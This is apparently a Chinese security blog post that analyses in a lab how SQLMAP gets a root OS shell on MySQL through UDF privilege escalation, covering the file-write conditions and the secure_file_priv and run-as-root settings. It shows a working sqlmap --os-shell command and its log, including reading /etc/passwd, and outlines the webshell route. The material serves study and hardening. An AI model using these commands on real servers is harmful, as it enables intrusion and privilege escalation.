---
layout: post
title: 利用SQLMAP获取os-shell的过程分析「UDF」
description: ""
keywords: ""
---

### 结论

关于MySQL读写文件的条件限制是老生常谈的问题，由于SQLMAP获取os-shell的两种方法均需要文件写入操作，这里先摆出结论：

1、MySQL服务默认以mysql用户权限启动，并没有危险目录（/usr/lib64/mysql/plugin[root 755]、/var/www/html[root 755]、/var/spool/cron[root 700]、/root/.ssh[root 700]等）下的文件写入权限。

2、MySQL 5.6.34版本以后的secure_file_priv参数默认值为NULL或指定的/var/lib/mysql-files，即禁止在危险目录写入。

\* 针对结论1，受害者可以使用`--user=root`启动服务获取系统root权限；也可以将相应目录给予o+w权限（其他用户写权限）。实际情况下前者几乎不存在，后者却存在许多嫌麻烦的糊涂蛋给予web目录（/var/www/html）777权限的，以至于被写入webshell。

\* 针对结论2，secure-file-priv属于Server System Variables，需要在配置中修改。即使有条件修改配置文件（/etc/my.cnf），也必须重启MySQL服务才能生效。

\* 至于文件读取，所需条件同理，本文不做分析。

\+ System root和System mysql、System root和MySQL root、MySQL root和MySQL user有明显区别。

### 默认环境

CentOS 7.7.1908、MySQL 5.7.29（--secure-file-priv=/var/lib/mysql-files）、SQLMAP 1.4.2

使用`sqlmap -hh`可以得到详细帮助文档，可以发现：-d参数是连接数据库参数，--os-shell获取交互shell。

```
-d DIRECT           Connection string for direct database connection
--os-shell          Prompt for an interactive operating system shell
```

利用SQLMAP实现MySQL os-shell有两个途径，一是本文重点分析的由UDF提权获取的SystemShell，一是普通SQL注入获取的Webshell。

### UDF（-d参数）

System root下使用systenctl启动MySQL服务，默认是以System mysql权限启动，使用lsof查看：

```
[root@localhost ~]# lsof -i :3306
COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
mysqld  14754 mysql   17u  IPv6 109862      0t0  TCP *:mysql (LISTEN)
```

利用SQLMAP -d连接数据库会提示没有权限写入：

```
[Sewell]: ~
➜  sqlmap -d "mysql://root:`echo $pass`@172.16.58.130:3306/mysql" --os-shell --no-cast
[22:51:15] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[22:51:15] [ERROR] there has been a problem uploading the shared library, it looks like the binary file has not been written on the database underlying file system
```

\* 由于密码包含特殊符号，这里使用环境变量输出。

使用`--user=root`以System root用户权限启动服务，使用`secure_file_priv=''`更改默认参数值为空（Empty），完成环境搭建。

```
mysqld --user=root --secure_file_priv=''
```

\* 为了方便，可以在默认配置文件`/etc/my.cnf`的`[mysqld]`下添加`user=root`和`secure_file_priv=''`，并使用`mysqld`重新启动MySQL服务。

\+ 若在MySQL客户端中执行读取或写入命令有如下提示，表示受--secure-file-priv限制：

```
The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

\+ 默认情况下查看--secure-file-priv值：

```
mysql> show global variables LIKE "secure_file_priv";
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
1 row in set (0.01 sec)
```

重新利用SQLMAP -d执行，成功上传二进制so文件，并返回shell。

```
[Sewell]: ~
➜  sqlmap -d "mysql://root:`echo $pass`@172.16.58.130:3306/mysql" --os-shell --no-cast
[15:32:48] [INFO] connection to MySQL server '172.16.58.130:3306' established
[15:32:48] [INFO] testing MySQL
[15:32:48] [INFO] confirming MySQL
[15:32:48] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[15:32:48] [INFO] fingerprinting the back-end DBMS operating system
[15:32:48] [INFO] the back-end DBMS operating system is Linux
[15:32:48] [INFO] testing if current user is DBA
[15:32:48] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[15:32:57] [INFO] detecting back-end DBMS version from its banner
[15:32:57] [INFO] retrieving MySQL plugin directory absolute path
[15:32:57] [INFO] the local file '/var/folders/48/8d13hmr53_z6ppgcpm5hszkr0000gn/T/sqlmapz0cosk4r52452/lib_mysqludf_sys4ptdzt5a.so' and the remote file '/usr/lib64/mysql/plugin/libscwmi.so' have the same size (8040 B)
[15:32:57] [INFO] creating UDF 'sys_exec' from the binary UDF file
[15:32:57] [INFO] creating UDF 'sys_eval' from the binary UDF file
[15:32:57] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[15:32:57] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a]
command standard output: 'uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023'
os-shell> cat /etc/passwd
do you want to retrieve the command standard output? [Y/n/a]
command standard output:
---
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
---
os-shell> exit
[15:33:12] [INFO] cleaning up the database management system
do you want to remove UDF 'sys_exec'? [Y/n]
do you want to remove UDF 'sys_eval'? [Y/n]
[15:33:14] [INFO] database management system cleanup finished
[15:33:14] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually
[15:33:14] [INFO] connection to MySQL server '172.16.58.130:3306' closed
```

使用ping命令阻塞os-shell，并利用pstree查看进程树，可发现拿到的是System root Shell：

```
[root@localhost 4gaka]# lsof -i :3306
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
mysqld  16261 root   16u  IPv6 128373      0t0  TCP *:mysql (LISTEN)
mysqld  16261 root   40u  IPv6 129424      0t0  TCP localhost.localdomain:mysql->gateway:63712 (ESTABLISHED)
[root@localhost 4gaka]# pstree -p 16261
mysqld(16261)─┬─ping(16416)
              ├─{mysqld}(16262)
              ...
              └─{mysqld}(16322)
```

使用Wireshark抓包，过滤出MySQL协议的数据包，右键任意包 -> 追踪流 -> TCP流，以ASCII显示，发现如下信息：

![SQLMAP_MySQL_1](/assets/images/2020-02-27/SQLMAP_MySQL.png)

利用的SQL语句和常规UDF提权语句大同小异，具体流程见图注释。

### Webshell（常规注入）

网上分析较多，BxScope师傅的较为详细，[对利用sqlmap获取os-shell过程的一次抓包分析](https://www.cnblogs.com/BxScope/p/10883422.html)，文章将每个数据包均记录了下来，常规注入获取的os-shell大致流程是：利用SELECT ... INTO OUTFILE ... LINES TERMINATED BY上传小马（仅上传功能） -> 利用小马上传Webshell（可使用system、proc_open、shell_exec、passthru、popen、exec执行命令） -> 利用Webshell执行命令（明文参数cmd=whoami）。

### 参考

官方防范建议：[security-against-attack](https://dev.mysql.com/doc/refman/8.0/en/security-against-attack.html)

```
Never run the MySQL server as the Unix root user. This is extremely dangerous, because any user with the FILE privilege is able to cause the server to create files as root (for example, ~root/.bashrc). To prevent this, mysqld refuses to run as root unless that is specified explicitly using the --user=root option.
```

2、secure_file_priv属性介绍：[server-system-variables](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)

3、SQLMAP支持MySQL和PostgreSQL的UDF [so文件](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf)

4、抓取的Pcap Demo: [SQLMAP_UDF](/assets/images/2020-02-27/SQLMAP_MySQL.pcap) 